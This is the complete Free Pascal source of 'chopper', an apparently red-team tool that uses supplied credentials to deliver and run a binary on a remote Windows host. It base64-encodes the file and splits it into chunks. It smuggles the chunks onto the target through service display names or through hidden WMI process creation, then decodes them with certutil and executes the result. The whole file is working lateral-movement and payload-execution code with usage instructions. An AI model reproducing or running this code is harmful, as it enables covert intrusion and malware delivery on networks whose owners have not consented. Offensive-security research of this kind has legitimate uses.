program chopper;

{$mode Delphi}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils,jwawinsvc, windows,base64,comobj,activex,variants,CustApp
  { you can add units after this };

const
 wbemFlagForwardOnly = $00000020;
 HIDDEN_WINDOW       = 0;



type

  { Tchopper }

  Tchopper = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure chop_chop; virtual;
    procedure chop_done; virtual;
    procedure s_wmi;virtual;
    procedure usage; virtual;
  end;

{ Tchopper }

procedure Tchopper.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('s t u p d f m w', 'chop target username password domain filename chd wmi');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('s', 'chopchop') then begin
    chop_chop;
    Terminate;
    Exit;
  end;

  if hasoption('m','chd') then begin

  chop_done;
  terminate;
  end;

  if hasoption('w','wmi') then begin
  s_wmi;
  terminate;
  end;
  usage;
  // stop program loop
  Terminate;
end;



procedure smuggle_wmi(username,password,host,chunk:OLEVariant);

var
  FSWbemLocator : OLEVariant;
  FWMIService   : OLEVariant;
  FWbemObjectSet: OLEVariant;
  FWbemObject   : OLEVariant;
  oEnum         : IEnumvariant;
  iValue        : LongWord;
  objProcess    : OLEVariant;
  objConfig     : OLEVariant;
  ProcessID     : Integer;
  backdoor : OLEVariant;
 // username,password,host: OLEVariant;
  srvhost :string;
  i:integer;
  ssl_enabled : Boolean;
begin;


  FSWbemLocator := CreateOleObject('WbemScripting.SWbemLocator');
  FWMIService   := FSWbemLocator.ConnectServer(host, 'root\CIMV2', username, password);
  FWbemObject   := FWMIService.Get('Win32_ProcessStartup');
  objConfig     := FWbemObject.SpawnInstance_;

  objConfig.ShowWindow := HIDDEN_WINDOW;
  objProcess    := FWMIService.Get('Win32_Process');
  objProcess.Create(chunk, null, objConfig, ProcessID);
  Writeln(Format('Pid %d',[ProcessID]));
  writeln('[+] task has been created successfully  ..!');

end;

procedure banner;
begin
writeln('-----------------------------------------------------------');
writeln('#1 - Smuggling binary via Service DisplayName');
writeln('#2 - Smuggling binary via WMI');
writeln('Research : https://bit.ly/3ipnbDT');
writeln('Author : Lawrence Amer @zux0x3a , https://0xsp.com');
writeln('-----------------------------------------------------------');
writeln('USAGE Technique #1: '+'chopper.exe -s -u USERNAME -p PASSWORD -d DOMAIN -t MACHINE -f LOCALBINARYPATH');
writeln('USAGE Technique #2: '+'chopper.exe -m -u USERNAME -p PASSWORD -d DOMAIN -t MACHINE -f LOCALBINARYPATH');
writeln('USAGE Technique #3: '+'chopper.exe -w -u DOMAIN\USERNAME -p PASSWORD -t MACHINE -f LOCALBINARYPATH');
writeln('-----------------------------------------------------------');
writeln('');


end;

function FileToBase64(const AFile: String; var Base64: String): Boolean;
var
  MS: TMemoryStream;
  Str: String;
begin
  Result := False;
  if not FileExists(AFile) then
    Exit;
  MS := TMemoryStream.Create;
  try
    MS.LoadFromFile(AFile);
    if MS.Size > 0 then
    begin
      SetLength(Str, MS.Size div SizeOf(Char));
      MS.ReadBuffer(Str[1], MS.Size div SizeOf(Char));
      Base64 := EncodeStringBase64(Str);
      Result := True;
    end;
  finally
    MS.Free;
  end;
end;

// thanks for https://www.swissdelphicenter.ch/
 function ServiceStart(
  sMachine,
  sService : string ) : boolean;
var

  schm, schs   : SC_Handle;

  ss     : TServiceStatus;
  psTemp : pointer;
  dwChkP : DWord;
  hToken: Thandle;
begin

  ss.dwCurrentState := 0;

  // connect to the service
  // control manager
  schm := OpenSCManager(PChar(sMachine),Nil,SC_MANAGER_CONNECT);

  // if successful...
  if(schm > 0)then
  begin
    // open a handle to
    // the specified service
    schs := OpenService(
      schm,
      PChar(sService),
      // we want to
      // start the service and
      SERVICE_START or
      // query service status
      SERVICE_QUERY_STATUS);

    // if successful...
    if(schs > 0)then
    begin
      psTemp := Nil;
      if(StartService(
           schs,
           0,
           psTemp))then
      begin
        // check status
        if(QueryServiceStatus(
             schs,
             ss))then
        begin
          while(SERVICE_RUNNING
            <> ss.dwCurrentState)do
          begin

            dwChkP := ss.dwCheckPoint;

            Sleep(ss.dwWaitHint);

            if(not QueryServiceStatus(
                 schs,
                 ss))then
            begin
              break;
            end;

            if(ss.dwCheckPoint <
              dwChkP)then
            begin
              break;
            end;
          end;
        end;
      end;
      CloseServiceHandle(schs);
    end;
    CloseServiceHandle(schm);
  end;
  Result :=
    SERVICE_RUNNING =
      ss.dwCurrentState;
end;


function decoder_service(username,password,domain,sMachine, sService: PChar): DWORD;
 var
   SCManHandle, SvcHandle: SC_Handle;
   htoken:Thandle;
   SS: TServiceStatus;
   dwStat: DWORD;
   ServiceName,ServiceDisplayName,ServiceExecutable:Pchar;
 begin


 servicename := 'final_seg';
 servicedisplayname := 'Let me in';
 ServiceExecutable := pchar('c:\windows\system32\cmd.exe /c certutil -decode -f tmp_payload.txt payload.exe & payload.exe"');



 hToken := 0;
 LogonUser(username, domain, password,
    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken);

ImpersonateLoggedOnUser(hToken);
   dwStat := 0;
   // Open service manager handle.
   SCManHandle := OpenSCManager(sMachine, nil, SC_MANAGER_ALL_ACCESS);
   if (SCManHandle > 0) then
   begin

     SvcHandle := OpenService(SCManHandle, sService, SERVICE_QUERY_STATUS);
     Svchandle := CreateService(SCManHandle,ServiceName,ServiceDisplayName,SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,ServiceExecutable,nil,nil,nil,nil,nil);

     if (SvcHandle > 0) then
     begin
       // SS structure holds the service status (TServiceStatus);
        //  servicestart;
       writeln('[+] executing the payload..');
       ServiceStart(sMachine,servicename);

       if (QueryServiceStatus(SvcHandle, SS)) then
         dwStat := ss.dwCurrentState;
       CloseServiceHandle(SvcHandle);
     end;
     CloseServiceHandle(SCManHandle);
   end;
   Result := dwStat;
 end;


Function ServiceDelete(sMachine, sService: pchar): Boolean;
Var
  schm, schs: SC_Handle;
  ss: TServiceStatus;
  dwChkP: dword;
Begin
  Result := False;
  schm := OpenSCManager(PChar(sMachine), Nil, SC_MANAGER_CONNECT);
  If schm > 0 Then Begin
    schs := OpenService(schm, PChar(sService),STANDARD_RIGHTS_REQUIRED or SERVICE_STOP Or SERVICE_QUERY_STATUS);
    If schs > 0 Then Begin
      If (QueryServiceStatus(schs, ss)) Then Begin
        While (SERVICE_STOPPED <> ss.dwCurrentState) Do Begin
          ControlService(schs, SERVICE_CONTROL_STOP, ss);
          dwChkP := ss.dwCheckPoint;
          Sleep(ss.dwWaitHint);
          If (Not QueryServiceStatus(schs, ss)) Then
            Break;
          If (ss.dwCheckPoint < dwChkP) Then
            Break;
        End;
      End;
      DeleteService(schs);
      CloseServiceHandle(schs);
    End;
    CloseServiceHandle(schm);

    // If service does not exist, then everything is fine.
    schm := OpenSCManager(PChar(sMachine), Nil, SC_MANAGER_CONNECT);
    If schm > 0 Then Begin
      schs := OpenService(schm, PChar(sService), SERVICE_QUERY_STATUS);
      If schs = 0 Then Begin
        If GetLastError = ERROR_SERVICE_DOES_NOT_EXIST Then
          Result := True;
      End Else Begin
        CloseServiceHandle(schs);
      End;
      CloseServiceHandle(schm);
    End;
  End;
End;

function create_tmp_service(username,password,domain,sMachine:Pchar):boolean;
var
   SCManHandle, SvcHandle: SC_Handle;
   htoken:Thandle;
   SS: TServiceStatus;
   dwStat: DWORD;
   ServiceName,ServiceDisplayName,ServiceExecutable:Pchar;
begin


  servicename := 'chopper';
  ServiceExecutable := pchar('c:\windows\system32\cmd.exe /c powershell -command "Get-Service "'+Pchar(servicename)+'" | select -Expand DisplayName |out-file -append tmp_payload.txt"');
   ServiceDisplayName := 'NODATA';
hToken := 0;
 LogonUser(username, domain, password,
    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken);

ImpersonateLoggedOnUser(hToken);
   dwStat := 0;


   // Open service manager handle.
   SCManHandle := OpenSCManager(sMachine, nil, SC_MANAGER_ALL_ACCESS);
   if (SCManHandle > 0) then
   begin

     SvcHandle := OpenService(SCManHandle, servicename, SERVICE_QUERY_STATUS);
     try
     sleep(1); // thats will sleep for a while to make sure execution is on place
     Svchandle := CreateService(SCManHandle,ServiceName,ServiceDisplayName,SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,ServiceExecutable,nil,nil,nil,nil,nil);

     except on E: exception do
         writeln(E.Message);
     end;
     if (Svchandle > 0 ) then

     result := true
     else
       result := false;
end;
   end;
 function modify_service(username,password,domain,sMachine:Pchar;chunk:string): Dword;
 var
   SCManHandle, SvcHandle: SC_Handle;
   htoken:Thandle;
   SS: TServiceStatus;
   dwStat: DWORD;
   ServiceName,ServiceDisplayName,ServiceExecutable:Pchar;
   len,numelem ,i: integer;
   arr : array of string;
   isokay,status : boolean;
 begin

    hToken := 0;
 LogonUser(username, domain, password,
    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken);

ImpersonateLoggedOnUser(hToken);
   dwStat := 0;

   isokay := create_tmp_service(username,password,domain,sMachine);


 len := length(chunk);
 numelem := len div 150;

 if len mod 150 <>0 then
 inc(NumElem);
 setLength(arr,NumElem);

 for i := 0 to High(arr) do
 Arr[i] := copy(chunk,i * 150 + 1, 150);

 for i := 0 to High (arr) do begin


 servicename := 'chopper';
 servicedisplayname := pchar(Arr[i]);


   SCManHandle := OpenSCManager(sMachine, nil, SC_MANAGER_ALL_ACCESS);
   if (SCManHandle > 0) then
   begin
     SvcHandle := OpenService(SCManHandle, servicename, SERVICE_ALL_ACCESS);
     try
     sleep(1); // thats will sleep for a while to make sure execution is on place
      status := ChangeServiceConfigA(SvcHandle,SERVICE_NO_CHANGE,SERVICE_NO_CHANGE,SERVICE_NO_CHANGE,nil, nil, nil, nil, nil, nil,servicedisplayname)
     except on E: exception do
         writeln(E.Message);
     end;
     if (status) then
     begin
        //  servicestart;
       writeln('[+] Service modified with the payload chunk');
       ServiceStart(sMachine,servicename);

       if (QueryServiceStatus(SvcHandle, SS)) then
         dwStat := ss.dwCurrentState;
       CloseServiceHandle(SvcHandle);
     end;
     CloseServiceHandle(SCManHandle);
   end;
   Result := dwStat;
 end;
 end;


 function Get_Create_service(username,password,domain,sMachine: PChar;chunk:string): DWORD;
 var
   SCManHandle, SvcHandle: SC_Handle;
   htoken:Thandle;
   SS: TServiceStatus;
   dwStat: DWORD;
   ServiceName,ServiceDisplayName,ServiceExecutable:Pchar;
   len,numelem ,i,ch: integer;
   arr : array of string;
 begin
   ch := 0;
 len := length(chunk);
 numelem := len div 150;

 if len mod 150 <>0 then
 inc(NumElem);
 setLength(arr,NumElem);

 for i := 0 to High(arr) do
 Arr[i] := copy(chunk,i * 150 + 1, 150);

 for i := 0 to High (arr) do begin
 inc(ch,1);

 servicename := pchar('seg'+inttostr(ch));
 servicedisplayname := pchar(Arr[i]);
 ServiceExecutable := pchar('c:\windows\system32\cmd.exe /c powershell -command "Get-Service "'+Pchar(servicename)+'" | select -Expand DisplayName |out-file -append tmp_payload.txt"');



 hToken := 0;
 LogonUser(username, domain, password,
    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken);

ImpersonateLoggedOnUser(hToken);
   dwStat := 0;
   // Open service manager handle.
   SCManHandle := OpenSCManager(sMachine, nil, SC_MANAGER_ALL_ACCESS);
   if (SCManHandle > 0) then
   begin

     SvcHandle := OpenService(SCManHandle, servicename, SERVICE_QUERY_STATUS);
     try
     sleep(1000); // thats will sleep for a while to make sure execution is on place
     Svchandle := CreateService(SCManHandle,ServiceName,ServiceDisplayName,SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,ServiceExecutable,nil,nil,nil,nil,nil);

     except on E: exception do
         writeln(E.Message);
     end;
     if (SvcHandle > 0) then
     begin
       // SS structure holds the service status (TServiceStatus);
        //  servicestart;
       ServiceStart(sMachine,servicename);
        ServiceDelete(sMachine,servicename);

       if (QueryServiceStatus(SvcHandle, SS)) then
         dwStat := ss.dwCurrentState;
       CloseServiceHandle(SvcHandle);
     end;
     CloseServiceHandle(SCManHandle);
   end;
   Result := dwStat;
 end;
 end;
constructor Tchopper.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor Tchopper.Destroy;
begin
  inherited Destroy;
end;
procedure Tchopper.s_wmi;
var
 username,password,host,res,process,filename:string;
 i,p:integer;
  len,numelem: integer;
  arr : array of string;
begin

  banner;
  writeln('Technique #3 - Smuggling via WMI');
 for i := 1 to paramcount do begin
  //check arg option
  if (paramstr(i)='-t') then begin
     host := paramstr(i+1);
  end;
    if (paramstr(i)='-u') then begin
     username := paramstr(i+1);
  end;
      if (paramstr(i)='-p') then begin
     password := paramstr(i+1);
  end;
    if (paramstr(i) ='-f') then begin
     filename := paramstr(i+1);
    end;
    filetobase64(filename,res);

 end;
// loop becomes here
len := length(res);
numelem := len div 150;

if len mod 150 <>0 then
inc(NumElem);
setLength(arr,NumElem);

for p := 0 to High(arr) do
Arr[p] := copy(res,p * 150 + 1, 150);

for p := 0 to High (arr) do begin

process := 'c:\windows\system32\cmd.exe /c powershell.exe -command "'''+Arr[p]+''' |out-file -append c:\Users\Public\chop.enc"';
writeln(process);
smuggle_wmi(username,password,host,process);
end;
writeln('[+] Prepare to execute ');
sleep(1000);

smuggle_wmi(username,password,host,'c:\windows\system32\cmd.exe /c certutil -decode -f c:\Users\Public\chop.enc c:\Users\Public\chopper.exe & c:\Users\Public\chopper.exe');


end;

procedure Tchopper.usage;
begin
banner;
end;



procedure Tchopper.chop_done;
var
  username,password,domain,machine,filename:string;
  res:string;
  i:integer;
begin
banner;
writeln('Technique #2 - Chop Done - Modify Service Display Name');


for i := 1 to paramcount do begin
  //check arg option
  if (paramstr(i)='-t') then begin
     machine := paramstr(i+1);
  end;
    if (paramstr(i)='-u') then begin
     username := paramstr(i+1);
  end;
      if (paramstr(i)='-p') then begin
     password := paramstr(i+1);
  end;
    if (paramstr(i)='-d') then begin
     domain := paramstr(i+1);
  end;
    if (paramstr(i) ='-f') then begin
     filename := paramstr(i+1);
    end;

end;

filetobase64(filename,res);
writeln('[->] sending payload..as chuncks');
modify_service(pchar(username),pchar(password),pchar(domain),pchar(machine),res);
decoder_service(pchar(username),pchar(password),pchar(domain),pchar(machine),'final_seg');
end;



procedure Tchopper.chop_chop;
var
  username,password,domain,machine,filename:string;
  res:string;
  i:integer;
begin
banner;
writeln('Technique #1 - Chop Chop - Create/delete');


for i := 1 to paramcount do begin
  //check arg option
  if (paramstr(i)='-t') then begin
     machine := paramstr(i+1);
  end;
    if (paramstr(i)='-u') then begin
     username := paramstr(i+1);
  end;
      if (paramstr(i)='-p') then begin
     password := paramstr(i+1);
  end;
    if (paramstr(i)='-d') then begin
     domain := paramstr(i+1);
  end;
    if (paramstr(i) ='-f') then begin
     filename := paramstr(i+1);
    end;

end;

filetobase64(filename,res);
writeln('[->] sending payload..as chuncks');
Get_Create_service(pchar(username),pchar(password),pchar(domain),pchar(machine),res);
decoder_service(pchar(username),pchar(password),pchar(domain),pchar(machine),'final_seg');
end;



var
  Application: Tchopper;
begin
  Application:=Tchopper.Create(nil);
  Application.Title:='svc_smuggling';
  Application.Run;
  Application.Free;
end.

